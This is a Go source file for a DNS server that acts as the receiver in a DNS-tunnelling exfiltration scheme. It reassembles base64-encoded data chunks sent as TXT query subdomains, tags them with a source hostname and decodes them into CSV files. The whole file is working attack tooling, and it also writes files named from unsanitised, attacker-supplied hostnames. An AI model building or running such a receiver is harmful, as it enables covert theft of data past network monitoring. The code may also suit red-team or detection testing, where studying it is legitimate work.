package main

import (
	//"fmt"
	"io"
	"log"
	"strconv"
	"encoding/base64"
	"strings"
	"os"
	"flag"
	"io/ioutil"


	"github.com/miekg/dns"
)

const port = 53

func replaceChar(data string) string {
	return strings.Replace(data, "-", "=", -1)
}

func parseQuery(m *dns.Msg) {	
	for _, q := range m.Question {
		log.Printf("DNS query received for %s", q.Name)
		
		switch q.Qtype {

		case dns.TypeTXT:
			query := strings.Split(q.Name, ".")
			log.Println(len(query))
			hostname, _ := base64.StdEncoding.DecodeString(query[2])

			if strings.HasPrefix(q.Name, "n.n.") {
				log.Printf("Starting to receive data from %s", hostname)
			} else if strings.HasPrefix(q.Name, "f.f.") {
				log.Printf("Finished receiving data from %s", hostname)
				filename := string(hostname)+"_encoded.csv"
				output := string(hostname)+"_decode.csv"
				
				data, _ := ioutil.ReadFile(filename)
				decoded, _ := base64.StdEncoding.DecodeString(string(data))
				
				f, _ := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
				f.Write(decoded)
				f.Close()

				os.Remove(filename)
			} else if len(query) == 6 { //ignore random dns queries
				filename := string(hostname)+"_encoded.csv"
				data := replaceChar(query[0])

				f, _ := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
				f.WriteString(data)
				f.Close()
			}
			// ip := records[q.Name]
			// if ip != "" {
			// 	rr, err := dns.NewRR(fmt.Sprintf("%s A %s", q.Name, ip))
			// 	if err == nil {
			// 		m.Answer = append(m.Answer, rr)
			// 	}
			// }
		}
	}
}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func main() {
	var (
        port = flag.Int("port", 53, "Port to listen for DNS connections")
    )

    flag.Parse()

    file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	// attach request handler func
	dns.HandleFunc(".", handleDnsRequest)

	// start server
	log.Printf("Starting at Port %d\n", *port)

	server := &dns.Server{Addr: ":" + strconv.Itoa(*port), Net: "udp"}
	err := server.ListenAndServe()
	defer server.Shutdown()
	if err != nil {
		log.Fatalf("Failed to start server: %s\n ", err.Error())
	}
}